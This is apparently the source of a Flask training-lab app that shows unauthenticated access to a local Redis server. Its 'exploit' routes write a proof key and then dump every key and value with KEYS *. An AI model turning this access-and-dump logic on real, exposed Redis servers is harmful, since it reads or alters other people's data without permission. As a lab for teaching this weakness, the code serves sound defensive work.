from flask import Flask, render_template_string
import redis

app = Flask(__name__)

PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>NETRA — Unauthenticated Redis Lab</title>
    <style>
        body { background: #0A0E1A; color: #E0E0E0; font-family: 'Courier New', monospace; padding: 40px; }
        h1 { color: #D946EF; }
        .card { background: #1A1040; border: 1px solid #2D1B69; border-radius: 8px; padding: 24px; margin-top: 20px; }
        button { background: #D946EF; color: #0A0E1A; border: none; padding: 12px 24px; font-weight: bold; cursor: pointer; border-radius: 4px; font-family: inherit; margin-right: 8px; }
        button:hover { background: #E879F9; }
        pre { background: #0A0E1A; padding: 16px; border-radius: 4px; overflow-x: auto; border: 1px solid #2D1B69; }
        .critical { color: #F87171; font-weight: bold; }
        .safe { color: #4ADE80; }
    </style>
</head>
<body>
    <h1>🎯 NETRA — Unauthenticated Redis Access Lab</h1>
    <div class="card">
        <p>Target: <strong>127.0.0.1:6379</strong> (Redis, Docker container, no password set)</p>
        <p>Redis by default has no authentication. Anyone who can reach port 6379 can read,
        write, or delete every key in the database — no login required.</p>
        <form method="POST" action="/exploit/write">
            <button type="submit">Step 1: Write a Test Key (Proves Write Access)</button>
        </form>
        <form method="POST" action="/exploit/read">
            <button type="submit">Step 2: Read All Keys (Proves No Auth Required)</button>
        </form>
    </div>
    {% if result %}
    <div class="card">
        <h3 class="{{ 'critical' if success else 'safe' }}">
            {{ '⚠ VULNERABLE — Unauthenticated access confirmed' if success else '✔ Access denied — authentication required' }}
        </h3>
        <pre>{{ result }}</pre>
    </div>
    {% endif %}
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(PAGE, result=None, success=False)

@app.route("/exploit/write", methods=["POST"])
def exploit_write():
    try:
        r = redis.Redis(host="127.0.0.1", port=6379, socket_timeout=5)
        r.set("netra_lab_proof", "written without any authentication")
        result = (
            "Connected to 127.0.0.1:6379 — no password prompt.\n"
            "Executed: SET netra_lab_proof \"written without any authentication\"\n"
            "Write succeeded. No credentials were requested at any point."
        )
        return render_template_string(PAGE, result=result, success=True)
    except Exception as e:
        return render_template_string(PAGE, result=f"Connection failed:\n{e}", success=False)

@app.route("/exploit/read", methods=["POST"])
def exploit_read():
    try:
        r = redis.Redis(host="127.0.0.1", port=6379, socket_timeout=5)
        keys = r.keys("*")
        result = f"Connected to 127.0.0.1:6379 — no password prompt.\n"
        result += f"Executed: KEYS *\n\n"
        result += f"Found {len(keys)} key(s):\n"
        for k in keys:
            key_str = k.decode() if isinstance(k, bytes) else k
            try:
                val = r.get(key_str)
                val_str = val.decode() if isinstance(val, bytes) else val
            except Exception:
                val_str = "(non-string value)"
            result += f"  {key_str} = {val_str}\n"
        return render_template_string(PAGE, result=result, success=True)
    except Exception as e:
        return render_template_string(PAGE, result=f"Connection failed:\n{e}", success=False)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5002, debug=False)
